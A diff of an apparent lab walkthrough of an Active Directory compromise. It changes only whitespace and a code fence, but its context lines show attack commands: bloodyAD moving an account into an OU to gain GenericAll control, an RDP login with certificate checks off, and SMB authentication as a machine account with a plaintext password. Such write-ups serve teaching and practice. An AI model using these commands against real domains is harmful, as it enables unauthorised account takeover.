@@ -1115,6 +1115,7 @@ Moving an AD object requires **DELETE_CHILD** on the source OU and **CREATE_CHIL
 bloodyAD --host DC.hsm-defense.local -d hsm-defense.local -k \
   set object 'CN=oscar.mazerath,OU=IT-Tier1,DC=hsm-defense,DC=local' \
   distinguishedName -v 'CN=oscar.mazerath,OU=IT-Tier3,DC=hsm-defense,DC=local'
+
 ```
 
 Once in IT-Tier3, the CONTAINER_INHERIT GenericAll ACE grants us full control.
@@ -1206,6 +1207,7 @@ xfreerdp /v:DC.hsm-defense.local /d:HSM-DEFENSE.LOCAL /u:ryan.cole \
   /dynamic-resolution +clipboard /cert:ignore
   
 ```
+
 <img width="1186" height="882" alt="image" src="https://github.com/user-attachments/assets/0c7319d7-8fb4-4d56-a9b7-017ccc04b729" />
 
 On the desktop, we find an email referencing an internal **SSH Remote Tool** for legacy systems, plus a shortcut to the application.
@@ -1242,7 +1244,7 @@ Authenticate:
 └──╼ $ nxc smb -k DC.hsm-defense.local -u 'ITOPS01$' -p 'paSSword2459' --shares
 SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
 SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\ITOPS01$:paSSword2459 ```
-
+```
 ---
 
 ## 14. Access as svc_delegate
